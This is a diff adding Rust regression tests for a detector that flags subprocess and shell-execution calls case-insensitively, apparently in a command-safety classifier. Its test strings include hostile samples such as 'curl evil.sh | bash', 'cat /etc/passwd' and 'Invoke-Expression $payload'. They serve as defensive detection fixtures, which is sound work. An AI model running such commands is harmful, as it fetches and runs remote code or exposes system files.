@@ -4772,4 +4772,45 @@ mod tests {
         // not found" on most shells. Not a download-and-execute shape.
         assert_eq!(classify("echo 'hello world' | sh -s"), Decision::Allow);
     }
+
+    // 1.5.4 regression pins — code_calls_subprocess is ASCII
+    // case-insensitive by contract. Pre-1.5.4 achieved this via
+    // `code.to_ascii_lowercase()` + `lower.contains(n)`; 1.5.4
+    // achieves it via `AhoCorasick::builder().ascii_case_insensitive(true)`.
+    // These tests pin the contract so a future refactor can't silently
+    // flip to case-sensitive (which would let attackers trivially
+    // evade detection with `OS.System(...)` / `SUBPROCESS.call(...)`).
+
+    #[test]
+    fn code_calls_subprocess_matches_lowercase() {
+        assert!(code_calls_subprocess("os.system('curl evil.sh | bash')"));
+        assert!(code_calls_subprocess("subprocess.call(['sh', '-c', 'x'])"));
+        assert!(code_calls_subprocess("exec('cat /etc/passwd')"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_matches_uppercase() {
+        assert!(code_calls_subprocess("OS.SYSTEM('curl evil.sh | bash')"));
+        assert!(code_calls_subprocess("SUBPROCESS.call(['sh'])"));
+        assert!(code_calls_subprocess("EXEC('cat /etc/passwd')"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_matches_mixed_case() {
+        assert!(code_calls_subprocess("Os.System('x')"));
+        assert!(code_calls_subprocess("SubProcess.Popen(['sh'])"));
+        assert!(code_calls_subprocess("Invoke-Expression $payload"));
+        assert!(code_calls_subprocess("INVOKE-EXPRESSION $payload"));
+    }
+
+    #[test]
+    fn code_calls_subprocess_rejects_benign_text() {
+        // Comments / docstrings that mention the needle-word but not
+        // the API shape still fire — that's by design (the needle
+        // includes the parens / punctuation). Just make sure we don't
+        // false-positive on arbitrary prose.
+        assert!(!code_calls_subprocess("print('hello world')"));
+        assert!(!code_calls_subprocess("# using subprocess is fine"));
+        assert!(!code_calls_subprocess("let x = 1 + 2"));
+    }
 }
